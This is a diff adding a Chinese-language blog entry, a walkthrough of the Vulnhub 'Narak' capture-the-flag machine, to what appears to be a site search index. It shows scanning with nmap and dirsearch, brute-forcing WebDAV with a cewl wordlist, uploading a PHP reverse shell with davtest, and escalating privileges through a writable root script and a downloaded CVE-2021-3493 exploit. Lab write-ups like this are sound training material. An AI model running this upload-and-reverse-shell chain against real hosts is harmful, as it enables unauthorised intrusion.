@@ -945,4 +945,50 @@
         <tag>Linux提权</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Narak打靶</title>
+    <url>/2022/01/28/Narak/index/</url>
+    <content><![CDATA[<h1 id="Narak打靶"><a href="#Narak打靶" class="headerlink" title="Narak打靶"></a>Narak打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><p><code>arp-scan</code>获取目标IP，使用nmap进行端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ nmap -sV -p- 192.168.0.101</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-28 19:44 EST</span><br><span class="line">Nmap scan report for 192.168.0.101</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.64 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-目录扫描"><a href="#2-目录扫描" class="headerlink" title="2.目录扫描"></a>2.目录扫描</h3><p>使用<code>dirsearch</code>对目标进行目录扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ dirsearch -u http://192.168.0.101 -w /usr/share/wordlists/dirb/common.txt -e -f </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: -f | HTTP method: GET | Threads: 30 | Wordlist size: 4613</span><br><span class="line">Output File: /home/yifang/.dirsearch/reports/192.168.0.101/_22-01-28_19-47-41.txt</span><br><span class="line">Error Log: /home/yifang/.dirsearch/logs/errors-22-01-28_19-47-41.log</span><br><span class="line">Target: http://192.168.0.101/</span><br><span class="line">[19:47:41] Starting: </span><br><span class="line">[19:47:43] 200 -    3KB - /index.html</span><br><span class="line">[19:47:47] 401 -  460B  - /webdav</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-密码制作"><a href="#3-密码制作" class="headerlink" title="3.密码制作"></a>3.密码制作</h3><p>目标虽打开了web服务，但是在尝试了多种攻击后无果，只好使用暴力破解目标的 <code>webdav</code>的身份认证，但在尝试完 <code>rockyou.txt</code>之后无效，于是使用 <code>cewl</code>来进行密码字典制作，希望在web页面中找到密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl http://192.168.0.101 -w dict.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后使用<code>burpsuite</code>进行暴力破解，结果成功！得出密码为 <code>yamdoot:Swarg</code></p>
+<h3 id="4-攻击展开"><a href="#4-攻击展开" class="headerlink" title="4.攻击展开"></a>4.攻击展开</h3><p><code>webdav</code>存在任意文件上传漏洞，使用<code>davtest</code>进行测试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ davtest -url http://192.168.0.101/webdav -auth yamdoot:Swarg </span><br></pre></td></tr></table></figure>
+
+<p>在测试成功后，工具会向目标上传各种不同格式的文件，并验证是否有执行权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201290857365.png"></p>
+<p>上传反弹木马监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">davtest -url http://192.168.0.101/webdav -auth yamdoot:Swarg  -uploadfile php-reverse-shell.php -uploadloc dav.php</span><br></pre></td></tr></table></figure>
+
+<p>在<code>webdav</code>页面访问，本地监听反弹</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201290901613.png"></p>
+<p>成功反弹shell</p>
+<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>获取了<code>www-data</code>用户权限查看后无法获得sudo权限，只好寻找<code>权限配置不当</code>漏洞</p>
+<p>使用如下命令进行寻找</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -type f -user root -perm -ug=x,o=w -exec ls -l &#x27;&#123;&#125;&#x27; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>在目标系统寻找属主为root，组权限可以执行，其他权限可以写入的文件</p>
+<p>果然寻找到了<code>hell.sh</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201290910418.png"></p>
+<p>文本内的编码格式为 <code>brainfuck</code>加密，在该网站进行解码 <a href="https://tio.run/#brainfuck">https://tio.run/#brainfuck</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201290913853.png"></p>
+<p>解密成功后，内容为<code>chitragupt</code></p>
+<p>在经过测试后是目标系统 <code>inferno:chitragupt</code>的登录认证</p>
+<h3 id="6-CVE-2021-3493提权"><a href="#6-CVE-2021-3493提权" class="headerlink" title="6.CVE-2021-3493提权"></a>6.CVE-2021-3493提权</h3><p>使用ssh连接目标，然后本地启动http下载服务，<code>wget</code>进行下载<code>a.out</code></p>
+<p>下载完成之后进行执行，提权成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201290932835.png"></p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Easy</tag>
+      </tags>
+  </entry>
 </search>
